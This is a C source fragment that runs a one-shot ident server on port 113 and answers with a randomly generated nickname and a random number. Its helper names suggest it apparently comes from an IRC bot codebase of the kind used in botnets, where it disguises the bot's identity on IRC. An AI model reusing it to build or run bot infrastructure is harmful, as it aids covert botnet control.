#include "Includes.h"
#include "extern.h"

 #ifndef NO_IDENT
// ident server
 DWORD WINAPI ident(LPVOID param)
 {
	SOCKET isock, csock;
	SOCKADDR_IN issin, cssin;
	char user[12];
	char ibuff[32];

	isock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); // set isock to standard TCP socket
	WSAAsyncSelect(isock, 0, WM_USER + 1, FD_READ); // set async mode for isock
	memset(&issin, 0, sizeof(issin));
	issin.sin_family = AF_INET; // AF_INET is currently the only supported family
	issin.sin_port = htons(113); // set ident port
	bind(isock, (SOCKADDR *)&issin, sizeof(issin)); // bind issin to isock

	while(1) { // loop forever
		if (listen(isock, 10) == SOCKET_ERROR) return 0; // listen for connection. if we get SOCKET_ERROR, then something's wrong and so we return
		csock = accept(isock, (SOCKADDR *)&cssin, NULL); // try to accept a connection
		if (csock != INVALID_SOCKET) break; // if INVALID_SOCKET is returned, then we don't have a connection. otherwise, we're connected, so break
	}

	memset(user, 0, sizeof(user));
	srand(GetTickCount());
	rndnick(NULL,user,FALSE,LETTERNICK);

	memset(ibuff, 0, sizeof(ibuff));
	sprintf(ibuff, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, port, (char *)user); // build ident reply
	send(csock, ibuff, strlen(ibuff), 0);

	// we're done, so let's close our sockets and return
	closesocket(csock);
	closesocket(isock);

	return 0;
 }
 #endif
